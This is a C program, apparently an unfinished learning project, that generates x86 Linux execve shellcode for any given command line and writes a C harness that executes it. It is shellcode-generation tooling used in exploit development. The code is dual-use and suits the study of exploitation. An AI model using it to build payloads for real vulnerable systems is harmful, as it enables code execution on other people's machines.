/*
*TODO Add in read me doc here
*/
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

void writeShellcodeToFile(FILE* f,char* shellcode);
char* pad(char* string, int padWithSpaces);
int calculatePaddingNeeded(char* string);
void createEmptyArray(FILE *f,int size);

int main(int argc, char *argv[]){
	if(argc > 1){
		FILE *f = fopen("output.c","w");
		fprintf(f, "%s\n%s\n\n%s\n%s%s\"//xor eax,eax\n","#include <stdio.h>","#include <unistd.h>","//Assemlbly comments in NASM syntax.","char *shellcode=\"","\\x31\\xc0");
		//TODO look into freeing of shellcode pointer
		char* shellcode = pad(argv[1],0);
		writeShellcodeToFile(f,shellcode);
		//TODO better explanation
		//push current stack point into ebx, aka pointer to argv[1]
		fprintf(f, "\"%s\" //mov ebx,esp\n","\\x89\\xe3");
		createEmptyArray(f,(argc-2));

		//TODO better explanation
		//push each arg to stack and then add addr to the arg array
		for(int i = 2; i < argc; i++){
			char* shellcode = pad(argv[i],1);

			//if arg to add starts with tac
			fprintf(f, "\"%s\" //push eax\n","\\x50");
			char tac = '-';
			if( (strncmp(&tac, argv[i], 1) == 0) ){
				//only works for flags of one char length
				fprintf(f, "\"%s%x%s%x\" //pushw ''\n","\\x66\\x68\\x",argv[i][0],"\\x",argv[i][1]);
			}else{
				writeShellcodeToFile(f,shellcode);
			}
			//TODO better explanation
			//get the arg just pushed on the stacks current address and put insert the address onto the
			fprintf(f, "\"%s\" //mov edx,esp\n\"%s%x\" //mov [ecx+%d],edx\n","\\x89\\xe2","\\x89\\x51\\x",((i-1)*4),((i-1)*4));
		}
		//TODO better explanation
		//point the 3 arg char *const envp[] to null
		//push execve sys call number(11) into eax, and call sys interupt to execute execve
		fprintf(f, "\"%s\" //push eax\n\"%s\" //mov edx,esp\n\"%s\" //mov al,11\n\"%s\"; //int $0x80\n\n%s\n%s\n%s\n%s\n","\\x50","\\x89\\xe2","\\xb0\\x0b","\\xcd\\x80","int main(){","    int (*ret)() = (int(*)())shellcode;","    ret();","}");
		fclose(f);
	}else{
		//TODO - Add more detail responce
		printf("%s\n","Needs args.");
	}
}

//TODO come up with a way so the methods dont need file pointer
//TODO create more useful name
void createEmptyArray(FILE* f,int size){
	for(int i = 0; i <= size; i++){
		fprintf(f, "\"%s\" //push eax\n","\\x50");
	}
	//push ebx onto the end of the array and then save the addr of the array into  ecx
	fprintf(f, "\"%s\" //push ebx\n\"%s\" //mov ecx,esp\n","\\x53","\\x89\\xe1");
}

//TODO make it universal so it can deal with '-' starting args
//TODO create more useful name
void writeShellcodeToFile(FILE* f,char* shellcode){
	fprintf(f, "\"%s\" //push eax\n","\\x50");
	for(int i = (strlen(shellcode)); i > 0; i = i - 4){
		fprintf(f,"\"%s\\x%x\\x%x\\x%x\\x%x\" //push '%c%c%c%c'\n","\\x68",shellcode[i-4],shellcode[i-3],shellcode[i-2],shellcode[i-1],shellcode[i-4],shellcode[i-3],shellcode[i-2],shellcode[i-1]);
	}
}

//TODO two methods for one with / and other with ' '
char* pad(char* string,int padWithSpaces){
	int paddingNeeded = calculatePaddingNeeded(string);
	char* returning = calloc((paddingNeeded+strlen(string)+1),sizeof(char));

	if(padWithSpaces){
		strncpy(&returning[0],string,strlen(string));
		for(int i = 0;i < paddingNeeded; i++){
			strncpy(&returning[(i+strlen(string))]," ",1);
		}
	}else{
		for(int i = 0;i < paddingNeeded; i++){
			strncpy(&returning[i],"/",1);
		}
		strncpy(&returning[paddingNeeded],string,strlen(string));
	}

	return (returning);
}

int calculatePaddingNeeded(char* string){
	return (4 -((strlen(string))%4));
}
